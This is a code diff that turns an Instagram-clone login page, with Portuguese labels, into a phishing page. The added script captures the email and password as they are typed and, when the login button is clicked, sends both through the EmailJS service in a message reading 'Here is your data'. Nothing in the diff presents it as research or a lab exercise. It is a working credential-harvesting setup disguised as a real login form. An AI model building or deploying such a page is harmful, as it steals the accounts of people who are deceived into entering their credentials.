@@ -5,6 +5,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="./styles.css" />
     <title>Instagram clone</title>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+        </script>
+        <script type="text/javascript">
+        let email="";
+        let password="";
+
+        (function(){
+            emailjs.init("_Gckt2w5FVtdZFdl-");
+            
+        })();
+        function onChangeEmail(e) {
+            console.log(e.value);
+            this.email = e.value;
+        }
+
+        function onChangePassword(e) {
+            this.password = e.value;
+        }
+
+        function login() {
+            console.log({ email: this.email, password: this.password });
+            emailjs.send("service_mj52o8k","template_otbtsvn",{
+                from_name: "name",
+                to_name: "name",
+                message: `Here is your data: ${this.email} and ${this.password}`,
+            });
+        }
+        </script>
 </head>
 <body>
     <main class="flex align-items-center justify-content-center">
@@ -17,12 +46,12 @@
                 </h1>
                 <form>
                     <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
-                    <input name="email" placeholder="Telefone, nome de usuário ou e-mail" />
+                    <input name="email" oninput="onChangeEmail(this)" placeholder="Telefone, nome de usuário ou e-mail" />
 
                     <label for="password" class="sr-only">Senha</label>
-                    <input name="password" type="password" placeholder="Senha" />
+                    <input name="password" oninput="onChangePassword(this)" type="password" placeholder="Senha" />
 
-                    <button type="button">Entrar</button>
+                    <button onclick="login()" type="button">Entrar</button>
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
